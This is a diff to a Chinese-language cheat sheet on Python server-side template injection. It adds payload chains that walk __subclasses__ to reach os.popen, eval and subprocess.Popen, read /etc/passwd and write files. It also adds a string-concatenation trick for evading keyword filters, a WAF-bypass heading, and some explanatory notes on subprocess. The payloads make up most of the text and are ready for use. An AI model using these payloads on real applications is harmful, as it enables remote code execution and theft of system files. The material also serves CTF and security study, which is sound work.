@@ -1109,32 +1109,45 @@ __builtins__      内建模块的引用，在任何地方都是可见的(包括�
     [].__class__.__bases__[0]
     request.__class__.__mro__[1]
     #python3.7
-    ''.__。。。class__.__mro__[1]
+    ''.__class__.__mro__[1]
     {}.__class__.__bases__[0]
     ().__class__.__bases__[0]
     [].__class__.__bases__[0]
     request.__class__.__mro__[1]
 
     #python 2.7
-    #文件操作
-    #找到file类
+
+    ## 文件操作
+    # 找到file类
     [].__class__.__bases__[0].__subclasses__()[40]
-    #读文件
+    # 读文件
     [].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
-    #写文件
+    # 写文件
     [].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')
 
-    #命令执行
-    #os执行
+    ## 命令执行
+
+    # 下方payload中 '__init__'前面的都可以换成a,b,c...
+
+    # os执行
+
+    # 利用warnings.catch_warnings类
     # [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
     # popen('id')中的id可换成其他Linux命令
     [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
     #eval,impoer等全局函数
     #[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__ 下有eval，__import__等的全局函数，可以利用此来执行命令：
     [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
-    [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
+    # 字符拼接绕过关键字过滤
+    [].__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__'].__builtins__.eval("__import__('os').popen('id').read()")
     [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
     [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
+    
+    # 利用site._Printer类
+    [].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()
+
+    # 利用subprocess.Popen
+    [].__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()
 
     #python3.7
     #命令执行
@@ -1145,7 +1158,51 @@ __builtins__      内建模块的引用，在任何地方都是可见的(包括�
     "".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()
 ```
 
-Jinja2一些绕过WAF姿势
+**关于subprocess.Popen**
+
+subprocess这个模块是用来产生子进程，然后可以连接到这个子进程传入值并获得返回值
+
+subprocess中的Popen类，这个类中可以传入一些参数值
+
+```python
+class subprocess.Popen( 
+ args,						# 字符串或者列表，表示要执行的命令如：
+    subprocess.Popen(["cat","test.txt"]) # 或
+    subprocess.Popen("cat test.txt", shell=True)
+ bufsize=0,					# 缓存大小，0无缓冲，1行缓冲
+ executable=None,			# 程序名，一般不用
+ stdin=None,				# 子进程标准输入
+ stdout=None,				# 输出
+ stderr=None,				# 错误
+ preexec_fn=None,
+ close_fds=False,
+ shell=False,				# 为ture的时候，unix下相当于args前添加了一个 /bin/sh -c
+   							#				window下相当于添加 cmd.exe /c
+ cwd=None,					# 设置工作目录
+ env=None,					# 设置环境变量
+ universal_newlines=False,	# 各种换行符统一处理成 \n
+ startupinfo=None,			# window下传递给createprocess的结构体
+ creationflags=0)			# window下传递create_new_console创建自己的控制台窗口
+```
+
+**关于Popen.communicate()**
+
+communicate()：和子进程交互，发送和读取数据
+
+    使用 subprocess 模块的 Popen 调用外部程序，如果 stdout 或 stderr 参数是 pipe，
+
+    并且程序输出超过操作系统的 pipe size时，如果使用 Popen.wait() 方式等待程序结束获取返回值，会导致死锁，程序卡在 wait() 调用上
+
+    ulimit -a 看到的 pipe size 是 4KB，那只是每页的大小，查询得知 linux 默认的 pipe size 是 64KB。
+
+    使用 Popen.communicate()。这个方法会把输出放在内存，而不是管道里，
+
+    所以这时候上限就和内存大小有关了，一般不会有问题。而且如果要获得程序返回值，
+
+    可以在调用 Popen.communicate() 之后取 Popen.returncode 的值。
+
+
+**Jinja2一些绕过WAF姿势**
 
 过滤 "["
 
